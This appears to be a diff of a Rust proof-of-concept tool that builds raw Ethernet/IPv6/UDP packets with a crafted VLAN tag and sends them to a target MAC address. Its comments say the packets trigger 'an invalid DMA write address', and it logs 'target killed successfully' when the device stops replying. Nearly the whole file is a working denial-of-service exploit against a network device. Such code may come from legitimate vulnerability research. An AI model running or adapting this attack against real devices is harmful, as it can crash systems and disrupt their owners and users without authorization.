@@ -1,6 +1,6 @@
 use anyhow::{anyhow, bail, Context, Result};
 use clap::Parser;
-use log::info;
+use log::{info, warn};
 use pnet::{
     datalink::DataLinkReceiver,
     ipnetwork::IpNetwork,
@@ -22,7 +22,10 @@ use std::{
     time::{Duration, Instant},
 };
 
+////////////////////////////////////////////////////////////////////////////////
+
 const SOURCE_PORT: u16 = 2000;
+const DEST_PORT: u16 = 7777;
 
 /// Simple program to greet a person
 #[derive(Parser, Debug)]
@@ -40,6 +43,149 @@ struct Args {
     pad: usize,
 }
 
+fn main() -> Result<()> {
+    env_logger::Builder::from_env(
+        env_logger::Env::default().default_filter_or("info"),
+    )
+    .init();
+
+    // Open a bogus socket to listen on port 2000, which prevents the OS from
+    // replying with ICMPv6 messages about the port being unreachable.
+    let _socket = std::net::UdpSocket::bind(format!("[::]:{SOURCE_PORT}"))?;
+
+    let args = Args::parse();
+    let dest_mac = MacAddr::from_str(&args.mac)
+        .with_context(|| format!("failed to parse '{}'", args.mac))?;
+    let dest_ip = mac_to_ipv6(dest_mac);
+    info!("target MAC address:  {dest_mac:?}");
+    info!("target IPv6 address: {dest_ip:?}");
+
+    let interfaces = pnet::datalink::interfaces();
+    let interface = interfaces
+        .into_iter()
+        .find(|iface| iface.name == args.iface)
+        .ok_or_else(|| anyhow!("could not find interface '{}'", args.iface))?;
+    let source_mac = interface.mac.unwrap();
+    let source_ip = interface
+        .ips
+        .iter()
+        .find_map(|i| match i {
+            IpNetwork::V6(ip) => Some(ip.ip()),
+            _ => None,
+        })
+        .ok_or_else(|| anyhow!("could not get IPv6 address from interface"))?;
+
+    let cfg = pnet::datalink::Config {
+        read_timeout: Some(Duration::from_millis(100)),
+        ..Default::default()
+    };
+    let (mut sender, mut receiver) =
+        match pnet::datalink::channel(&interface, cfg)? {
+            pnet::datalink::Channel::Ethernet(tx, rx) => (tx, rx),
+            _ => bail!("Unknown channel type"),
+        };
+
+    let builder = Builder {
+        source_ip,
+        source_mac,
+        dest_ip,
+        dest_mac,
+    };
+
+    // Send a friendly packet to ensure that we're in the target's NDP tables
+    info!("sending initial packet to populate NDP tables");
+    let (udp, payload_len, tag) = builder.udp(&[0]);
+    let (ipv6, ethertype) = builder.ipv6(udp, payload_len, tag);
+    let hello_packet = builder.eth(ipv6, ethertype);
+    sender.send_to(hello_packet.packet(), None);
+    let (reply, _rx_time) =
+        receive_udp(receiver.as_mut(), Duration::from_millis(500)).ok_or_else(
+            || {
+                anyhow!(
+                    "could not send initial packet; \
+                     is the target already locked up?"
+                )
+            },
+        )?;
+    assert_eq!(reply, vec![0]);
+    info!("received reply from hello packet");
+
+    let (udp, payload_len, tag) = builder.udp(&[b'1']);
+    let (ipv6, ethertype) = builder.ipv6(udp, payload_len, tag);
+    let delay_packet = builder.eth(ipv6, ethertype);
+
+    // Build our attack packets with a VLAN VID payload, triggering an invalid
+    // DMA write address.
+    let mut packets = vec![];
+    for i in 1..6 {
+        let mut data: Vec<u8> = format!("data-{i}").as_bytes().to_vec();
+        for _p in 0..46 {
+            // found experimentally
+            data.push(b'0');
+        }
+        let (udp, payload_len, tag) = builder.udp(&data);
+        let (ipv6, ethertype) = builder.ipv6(udp, payload_len, tag);
+        let (vlan, ethertype) = builder.vlan(0x301, ipv6, ethertype);
+        let eth = builder.eth(vlan, ethertype);
+        packets.push(eth);
+    }
+
+    // Send our attack sequence
+    info!("sending attack sequence");
+    let send_start = Instant::now();
+    sender.send_to(delay_packet.packet(), None);
+    let send_end = Instant::now();
+    std::thread::sleep(Duration::from_millis(50));
+
+    for p in packets {
+        sender.send_to(p.packet(), None);
+    }
+    let (reply, rx_time) =
+        receive_udp(receiver.as_mut(), Duration::from_millis(500))
+            .ok_or_else(|| anyhow!("timeout waiting for rx"))?;
+    info!("received reply from delay packet: {reply:?}");
+
+    info!("time since send called:   {:?}", rx_time - send_end);
+    info!("time since send returned: {:?}", rx_time - send_start);
+
+    sender.send_to(hello_packet.packet(), None);
+    if receive_udp(receiver.as_mut(), Duration::from_millis(500)).is_none() {
+        info!("target killed successfully");
+    } else {
+        warn!("target is still replying");
+    }
+
+    Ok(())
+}
+
+/// Receives a single UDP packet
+///
+/// Returns the packet data and arrival time on success, or `None` on timeout
+fn receive_udp(
+    receiver: &mut dyn DataLinkReceiver,
+    timeout: Duration,
+) -> Option<(Vec<u8>, Instant)> {
+    let start = Instant::now();
+    while Instant::now() - start < timeout {
+        let Ok(rx) = receiver.next() else {
+            continue;
+        };
+        let rx_time = Instant::now();
+        let packet = EthernetPacket::new(rx).unwrap();
+        if EtherTypes::Ipv6 == packet.get_ethertype() {
+            let header = Ipv6Packet::new(packet.payload()).unwrap();
+            if IpNextHeaderProtocols::Udp == header.get_next_header() {
+                let udp = UdpPacket::new(header.payload()).unwrap();
+                if udp.get_destination() == SOURCE_PORT {
+                    return Some((udp.payload().to_owned(), rx_time));
+                }
+            }
+        }
+    }
+    None
+}
+
+/// Convert a MAC address to a link-local IPv6 address
 fn mac_to_ipv6(mut mac: MacAddr) -> Ipv6Addr {
     mac.0 ^= 2;
     Ipv6Addr::new(
@@ -54,6 +200,7 @@ fn mac_to_ipv6(mut mac: MacAddr) -> Ipv6Addr {
     )
 }
 
+/// Helper class to build relevant packets without too much boilerplate
 struct Builder {
     source_ip: Ipv6Addr,
     dest_ip: Ipv6Addr,
@@ -70,7 +217,7 @@ impl Builder {
         let mut udp =
             MutableUdpPacket::owned(vec![0u8; payload_len as usize]).unwrap();
         udp.set_source(SOURCE_PORT);
-        udp.set_destination(7777); // our target port
+        udp.set_destination(DEST_PORT); // our target port
         udp.set_payload(data);
         udp.set_length(payload_len); // UDP header length
         let udp_chk = pnet::packet::udp::ipv6_checksum(
@@ -139,128 +286,4 @@ impl Builder {
         eth.set_payload(data.packet());
         eth
     }
-}
-
-fn receive_udp(
-    receiver: &mut dyn DataLinkReceiver,
-    timeout: Duration,
-) -> Option<(Vec<u8>, Instant)> {
-    let start = Instant::now();
-    while Instant::now() - start < timeout {
-        let Ok(rx) = receiver.next() else {
-            continue;
-        };
-        let rx_time = Instant::now();
-        let packet = EthernetPacket::new(rx).unwrap();
-        if EtherTypes::Ipv6 == packet.get_ethertype() {
-            let header = Ipv6Packet::new(packet.payload()).unwrap();
-            if IpNextHeaderProtocols::Udp == header.get_next_header() {
-                let udp = UdpPacket::new(header.payload()).unwrap();
-                if udp.get_destination() == SOURCE_PORT {
-                    return Some((udp.payload().to_owned(), rx_time));
-                }
-            }
-        }
-    }
-    None
-}
-
-fn main() -> Result<()> {
-    env_logger::Builder::from_env(
-        env_logger::Env::default().default_filter_or("info"),
-    )
-    .init();
-
-    // Open a bogus socket to listen on port 2000, which prevents the OS from
-    // replying with ICMPv6 messages about the port being unreachable.
-    let _socket = std::net::UdpSocket::bind(format!("[::]:{SOURCE_PORT}"))?;
-
-    let args = Args::parse();
-    let dest_mac = MacAddr::from_str(&args.mac)
-        .with_context(|| format!("failed to parse '{}'", args.mac))?;
-    let dest_ip = mac_to_ipv6(dest_mac);
-    info!("target MAC address:  {dest_mac:?}");
-    info!("target IPv6 address: {dest_ip:?}");
-
-    let interfaces = pnet::datalink::interfaces();
-    let interface = interfaces
-        .into_iter()
-        .find(|iface| iface.name == args.iface)
-        .ok_or_else(|| anyhow!("could not find interface '{}'", args.iface))?;
-    let source_mac = interface.mac.unwrap();
-    let source_ip = interface
-        .ips
-        .iter()
-        .find_map(|i| match i {
-            IpNetwork::V6(ip) => Some(ip.ip()),
-            _ => None,
-        })
-        .ok_or_else(|| anyhow!("could not get IPv6 address from interface"))?;
-
-    // HERE WE GO
-    let builder = Builder {
-        source_ip,
-        source_mac,
-        dest_ip,
-        dest_mac,
-    };
-
-    let (udp, payload_len, tag) = builder.udp(&[b'1']);
-    let (ipv6, ethertype) = builder.ipv6(udp, payload_len, tag);
-    let delay_packet = builder.eth(ipv6, ethertype);
-
-    // Build our attack packets with a VLAN VID payload, triggering an invalid
-    // DMA write address.
-    let mut packets = vec![];
-    for i in 1..6 {
-        let mut data: Vec<u8> = format!("data-{i}").as_bytes().to_vec();
-        for _p in 0..46 {
-            // found experimentally
-            data.push(b'0');
-        }
-        let (udp, payload_len, tag) = builder.udp(&data);
-        let (ipv6, ethertype) = builder.ipv6(udp, payload_len, tag);
-        let (vlan, ethertype) = builder.vlan(0x301, ipv6, ethertype);
-        let eth = builder.eth(vlan, ethertype);
-        packets.push(eth);
-    }
-
-    let cfg = pnet::datalink::Config {
-        read_timeout: Some(Duration::from_millis(100)),
-        ..Default::default()
-    };
-    let (mut sender, mut receiver) =
-        match pnet::datalink::channel(&interface, cfg)? {
-            pnet::datalink::Channel::Ethernet(tx, rx) => (tx, rx),
-            _ => bail!("Unknown channel type"),
-        };
-
-    // Send a friendly packet to ensure that we're in the target's NDP tables
-    info!("sending initial packet to populate NDP tables");
-    let (udp, payload_len, tag) = builder.udp(&[0]);
-    let (ipv6, ethertype) = builder.ipv6(udp, payload_len, tag);
-    let hello_packet = builder.eth(ipv6, ethertype);
-    sender.send_to(hello_packet.packet(), None);
-    let (reply, _rx_time) =
-        receive_udp(receiver.as_mut(), Duration::from_millis(500))
-            .ok_or_else(|| anyhow!("timeout waiting for rx"))?;
-    info!("received reply from hello packet: {reply:?}");
-
-    // Send our attack sequence
-    info!("sending attack sequence");
-    let send_start = Instant::now();
-    sender.send_to(delay_packet.packet(), None);
-    let send_end = Instant::now();
-    for p in packets {
-        sender.send_to(p.packet(), None);
-    }
-    let (reply, rx_time) =
-        receive_udp(receiver.as_mut(), Duration::from_millis(500))
-            .ok_or_else(|| anyhow!("timeout waiting for rx"))?;
-    info!("received reply from delay packet: {reply:?}");
-
-    info!("time since send called:   {:?}", rx_time - send_end);
-    info!("time since send returned: {:?}", rx_time - send_start);
-
-    Ok(())
 }
